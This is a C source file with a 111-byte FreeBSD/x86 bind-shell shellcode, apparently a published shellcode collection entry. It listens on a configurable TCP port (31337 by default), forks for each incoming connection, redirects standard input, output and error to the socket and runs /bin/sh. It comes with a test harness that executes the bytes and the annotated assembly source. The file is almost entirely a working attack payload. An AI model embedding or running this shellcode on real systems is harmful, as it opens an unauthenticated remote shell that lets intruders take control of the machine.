/*
 -------------- FreeBSD/x86 - portbind shell + fork (111 bytes)--------------------
 *  AUTHOR : Tosh
 *   OS    : BSDx86 (Tested on FreeBSD 8.1)
 *   EMAIL : tosh@tuxfamily.org
 */



#include <stdio.h>
#include <string.h>
#include <arpa/inet.h>

char shellcode [] = "\x31\xc9\xf7\xe1\x51\x40\x50\x40\x50\x50\xb0\x61\xcd\x80\x96\x52\x66"
                    "\x68\x05\x39\x66\x68\x01\x02\x89\xe1\x6a\x10\x51\x56\x50\xb0\x68\xcd"
                    "\x80\x31\xc0\xb0\x05\x50\x56\x50\xb0\x6a\xcd\x80\x31\xc0\x50\x50\x56"
                    "\x50\xb0\x1e\xcd\x80\x97\x31\xc0\x50\xb0\x02\xcd\x80\x09\xc0\x74\xea"
                    "\x31\xc9\x31\xc0\x51\x57\x50\xb0\x5a\xcd\x80\xfe\xc1\x80\xf9\x03\x75"
                    "\xf0\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x52\x53\x89"
                    "\xe1\x52\x51\x53\xb0\x3b\x50\xcd\x80";

void change_shellcode(unsigned short port)
{
   *((unsigned short*)(shellcode + 18)) = htons(port);
}
void print_shellcode(void)
{
   int i;
   for(i = 0; i < sizeof(shellcode) - 1; i++)
   {
      printf("\\x%.2x", (unsigned char)shellcode[i]);
   }
   printf("\n");
}
int main(void)
{
   unsigned short port = 31337;

   change_shellcode(port);
   print_shellcode();
   printf("Shellcode len = %d bytes\n", sizeof(shellcode)-1);
   void (*f)() = (void*) shellcode;

   f();

   return 0;
}

/*
   section .text
      global _start

   _start:
      xor ecx, ecx
      mul ecx
      push ecx
      inc eax
      push eax
      inc eax
      push eax
      push eax
      mov al, 97        ; socket(AF_INET, SOCK_STREAM, 0)
      int 0x80

      xchg esi, eax

      push edx
      push word 0x3905
      push word 0x0201
      mov ecx, esp

      push byte 16
      push ecx
      push esi
      push eax
      mov al, 104       ; bind(sock, sockaddr*, sizeof(sockaddr))
      int 0x80

      xor eax, eax
      mov al, 5
      push eax
      push esi
      push eax
      mov al, 106       ; listen(sock, 5)
      int 0x80

   .ACCEPT:
      xor eax, eax
      push eax
      push eax
      push esi
      push eax
      mov al, 30        ; accept(sock, 0, 0)
      int 0x80

      xchg edi, eax

      xor eax, eax
      push eax
      mov al, 2         ; fork()
      int 0x80

      or eax, eax
      jz .ACCEPT


      xor ecx, ecx      ; dup2 STDERR, STDIN, STDOUT
   .L:
      xor eax, eax
      push ecx
      push edi
      push eax
      mov al, 90
      int 0x80
      inc cl
      cmp cl, 3
      jne .L

      push edx
      push '//sh'
      push '/bin'

      mov ebx, esp
      push edx
      push ebx
      mov ecx, esp
      push edx
      push ecx
      push ebx
      mov al, 59        ; execve("/bin//sh", ["/bin/sh", NULL], NULL)
      push eax
      int 0x80
*/